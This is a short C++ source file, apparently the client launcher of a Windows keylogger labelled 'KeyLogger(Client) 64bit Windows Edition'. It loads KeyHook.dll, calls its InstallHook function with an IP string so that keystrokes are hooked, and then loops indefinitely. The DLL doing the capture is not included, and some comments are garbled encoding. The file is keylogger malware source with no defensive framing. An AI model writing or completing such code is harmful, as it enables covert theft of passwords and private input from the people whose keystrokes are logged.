#include <stdio.h>
#include <iostream>

#include <windows.h>
#include <conio.h>

typedef BOOL(WINAPI *FInstallHook)(char IP_P[50]);
typedef BOOL(WINAPI *FUninstallHook)();

using namespace std;

int main()
{
    char IP[20]="totos";
    HINSTANCE inst = NULL;

    inst = LoadLibrary("KeyHook.dll");
    if(inst == NULL)
    {
        cerr << "DLL load error: " << GetLastError() << endl;
        goto cleanup;
    }

    FInstallHook InstallHook = (FInstallHook)GetProcAddress(inst, "InstallHook");
    FUninstallHook UninstallHook = (FUninstallHook)GetProcAddress(inst, "UninstallHook");

    if(InstallHook == NULL || UninstallHook == NULL)
    {
        cerr << "Function Load error: " << GetLastError() << endl;
        goto cleanup;
    }
    Hook:

    cout << "KeyLogger(Client) 64bit Windows Edition [1.0.0]" << endl;
    cout << "Copyright �� 2018 Wonjae Ji. All rights reserved." << endl;
    cout << endl;
    cout << "Press any key to continue";
    getch();
    system("cls");

    // ��ŷ�� �Ѵ�.
    if(InstallHook(IP))
    {
        while(true)
            getch();
        // ������� �Է��� ���� ��� ��ŷ�� �����Ѵ�.
        UninstallHook();
    }
    getch();

    cleanup:

    if(inst)
        FreeLibrary(inst);

    getch();

    return 0;
}
